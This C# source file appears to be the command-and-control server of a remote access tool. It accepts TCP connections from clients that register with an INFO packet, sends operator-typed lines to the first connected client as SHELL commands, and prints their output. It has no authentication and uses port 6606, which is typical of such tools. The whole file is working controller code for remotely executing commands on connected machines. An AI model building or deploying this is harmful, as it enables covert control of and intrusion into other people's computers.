// language: C#, file: Program.cs, project: SosokServer
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace SosokServer
{
    public class Packet
    {
        public string Type { get; set; } = "";
        public string Action { get; set; } = "";
        public string Payload { get; set; } = "";
        public string ClientId { get; set; } = "";

        public string Serialize() => JsonSerializer.Serialize(this);
        public static Packet? Deserialize(string json) => JsonSerializer.Deserialize<Packet>(json);
    }

    class Program
    {
        static Dictionary<string, TcpClient> _clients = new();

        static async Task Main(string[] args)
        {
            // Читаем порт из переменной окружения (Render подставляет свой), 
            // если её нет — используем 6606
            int port = int.Parse(Environment.GetEnvironmentVariable("PORT") ?? "6606");
            TcpListener listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Console.WriteLine($"=== СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port} ===");

            _ = Task.Run(ReadConsoleCommands);

            while (true)
            {
                TcpClient client = await listener.AcceptTcpClientAsync();
                _ = Task.Run(() => HandleClient(client));
            }
        }

        private static async Task HandleClient(TcpClient client)
        {
            var stream = client.GetStream();
            byte[] lenBuffer = new byte[4];
            try
            {
                while (client.Connected)
                {
                    await stream.ReadExactlyAsync(lenBuffer, 0, 4);
                    int len = BitConverter.ToInt32(lenBuffer, 0);
                    byte[] data = new byte[len];
                    await stream.ReadExactlyAsync(data, 0, len);

                    var packet = Packet.Deserialize(Encoding.UTF8.GetString(data));
                    if (packet == null) continue;

                    if (packet.Type == "INFO")
                    {
                        _clients[packet.ClientId] = client;
                        Console.WriteLine($"\n[+] Подключился клиент: {packet.ClientId} | {packet.Payload}\n> ");
                    }
                    else if (packet.Type == "RESP")
                    {
                        Console.WriteLine($"\n[{packet.ClientId}] Ответ ({packet.Action}):\n{packet.Payload}\n> ");
                    }
                }
            }
            catch { Console.WriteLine("\n[-] Клиент отключился.\n> "); }
        }

        private static async Task ReadConsoleCommands()
        {
            while (true)
            {
                Console.Write("> ");
                string? input = Console.ReadLine();
                if (string.IsNullOrWhiteSpace(input)) continue;

                if (_clients.Count == 0)
                {
                    Console.WriteLine("[!] Нет подключенных клиентов.");
                    continue;
                }

                var targetClient = _clients.Values.First();
                var packet = new Packet { Type = "CMD", Action = "SHELL", Payload = input };

                string json = packet.Serialize();
                byte[] data = Encoding.UTF8.GetBytes(json);
                byte[] len = BitConverter.GetBytes(data.Length);

                try
                {
                    _ = Task.Run(async () =>
                    {
                        var stream = targetClient.GetStream();
                        await stream.WriteAsync(len, 0, len.Length);
                        await stream.WriteAsync(data, 0, data.Length);
                    });
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Ошибка отправки: {ex.Message}");
                }
            }
        }
    }
}